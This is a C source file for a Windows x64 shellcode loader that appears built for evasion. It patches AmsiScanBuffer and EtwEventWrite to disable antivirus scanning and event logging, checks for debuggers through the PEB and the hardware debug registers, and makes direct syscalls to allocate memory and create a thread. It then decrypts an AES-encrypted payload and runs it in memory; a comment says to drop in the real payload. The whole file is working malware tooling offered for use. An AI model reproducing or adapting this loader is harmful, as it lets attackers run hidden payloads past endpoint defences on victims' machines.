#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <stdint.h>

#pragma comment(lib, "bcrypt.lib")

// Payload AES encrypted dummy example
unsigned char encrypted_payload[] = {
    // Thay payload thật vào đây (đã mã hóa AES-256-CBC)
    0x5A, 0x2D, 0x1B, 0xA7, 0xF4, 0x12, 0xCD, 0x88,
    0x91, 0xE4, 0x3F, 0xA6, 0xB8, 0xD7, 0x44, 0x3C,
    0xFE, 0x1D, 0xA9, 0x76, 0x44, 0xBE, 0x99, 0xC8
};

unsigned char aes_key[32] = {
    0x60, 0x3D, 0xEB, 0x10, 0x15, 0xCA, 0x71, 0xBE,
    0x2B, 0x73, 0xAE, 0xF0, 0x85, 0x7D, 0x77, 0x81,
    0x1F, 0x35, 0x2C, 0x07, 0x3B, 0x61, 0x08, 0xD7,
    0x2D, 0x98, 0x10, 0xA3, 0x09, 0x14, 0xDF, 0xF4
};

unsigned char aes_iv[16] = {
    0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07,
    0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F
};

typedef struct _PEB_LDR_DATA {
    BYTE Reserved1[8];
    PVOID Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef NTSTATUS(NTAPI* NtProtectVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect);

typedef NTSTATUS(NTAPI* NtAllocateVirtualMemory_t)(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect);

typedef NTSTATUS(NTAPI* NtCreateThreadEx_t)(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList);

static __forceinline NTSTATUS NtAllocateVirtualMemory_syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect)
{
    NTSTATUS status;
#ifdef _M_X64
    __asm {
        mov r10, rcx
        mov eax, 0x18
        syscall
        mov status, eax
    }
#else
#error "Only x64 supported"
#endif
    return status;
}

static __forceinline NTSTATUS NtProtectVirtualMemory_syscall(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    PSIZE_T RegionSize,
    ULONG NewProtect,
    PULONG OldProtect)
{
    NTSTATUS status;
#ifdef _M_X64
    __asm {
        mov r10, rcx
        mov eax, 0x50
        syscall
        mov status, eax
    }
#else
#error "Only x64 supported"
#endif
    return status;
}

static __forceinline NTSTATUS NtCreateThreadEx_syscall(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes,
    HANDLE ProcessHandle,
    PVOID StartRoutine,
    PVOID Argument,
    ULONG CreateFlags,
    ULONG_PTR ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    PVOID AttributeList)
{
    NTSTATUS status;
#ifdef _M_X64
    __asm {
        mov r10, rcx
        mov eax, 0xC1
        syscall
        mov status, eax
    }
#else
#error "Only x64 supported"
#endif
    return status;
}

static void PatchAMSI()
{
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return;
    void* pAmsiScan = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScan) return;

    DWORD oldProtect;
    VirtualProtect(pAmsiScan, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pAmsiScan = 0xC3;
    VirtualProtect(pAmsiScan, 1, oldProtect, &oldProtect);
}

static void PatchETW()
{
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;
    void* pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return;

    DWORD oldProtect;
    VirtualProtect(pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);
    *(BYTE*)pEtwEventWrite = 0xC3;
    VirtualProtect(pEtwEventWrite, 1, oldProtect, &oldProtect);
}

static bool IsDebuggerPresentAdvanced()
{
    if (IsDebuggerPresent()) return true;

    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb->BeingDebugged) return true;

    // Check debug registers Dr0-Dr3 for hardware breakpoints
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (GetThreadContext(hThread, &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) return true;
    }
    return false;
}

static bool AES_Decrypt(const unsigned char* enc_data, size_t enc_len, unsigned char* out_data, size_t& out_len, const unsigned char* key, const unsigned char* iv)
{
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD result = 0;
    DWORD cbResult = 0;

    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return false;

    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, (PUCHAR)key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }

    status = BCryptDecrypt(hKey, (PUCHAR)enc_data, (ULONG)enc_len, NULL, (PUCHAR)iv, 16, out_data, (ULONG)out_len, &cbResult, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptDestroyKey(hKey);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return false;
    }
    out_len = cbResult;
    BCryptDestroyKey(hKey);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    return true;
}

typedef struct _SHELLCODE_HEADER {
    DWORD Size;
    DWORD EntryOffset;
} SHELLCODE_HEADER;

int main()
{
    if (IsDebuggerPresentAdvanced()) return -1;

    PatchAMSI();
    PatchETW();

    size_t decrypted_buffer_size = 0x10000;
    unsigned char* decrypted_buffer = (unsigned char*)VirtualAlloc(NULL, decrypted_buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!decrypted_buffer) return -2;

    if (!AES_Decrypt(encrypted_payload, sizeof(encrypted_payload), decrypted_buffer, decrypted_buffer_size, aes_key, aes_iv)) {
        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
        return -3;
    }

    // Assume first sizeof(SHELLCODE_HEADER) bytes describe shellcode info
    SHELLCODE_HEADER* hdr = (SHELLCODE_HEADER*)decrypted_buffer;
    void* shellcode_ptr = decrypted_buffer + sizeof(SHELLCODE_HEADER);

    SIZE_T shellcode_size = hdr->Size;
    SIZE_T region_size = shellcode_size;

    PVOID exec_mem = NULL;
    NTSTATUS alloc_status = NtAllocateVirtualMemory_syscall(GetCurrentProcess(), &exec_mem, 0, &region_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (alloc_status != 0) {
        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
        return -4;
    }

    memcpy(exec_mem, shellcode_ptr, shellcode_size);

    ULONG oldProtect;
    NTSTATUS prot_status = NtProtectVirtualMemory_syscall(GetCurrentProcess(), &exec_mem, &region_size, PAGE_EXECUTE_READ, &oldProtect);
    if (prot_status != 0) {
        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
        return -5;
    }

    HANDLE hThread = NULL;
    NTSTATUS thread_status = NtCreateThreadEx_syscall(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), exec_mem, NULL, FALSE, 0, 0, 0, NULL);
    if (thread_status != 0) {
        VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
        return -6;
    }

    WaitForSingleObject(hThread, INFINITE);
    VirtualFree(decrypted_buffer, 0, MEM_RELEASE);
    return 0;
}
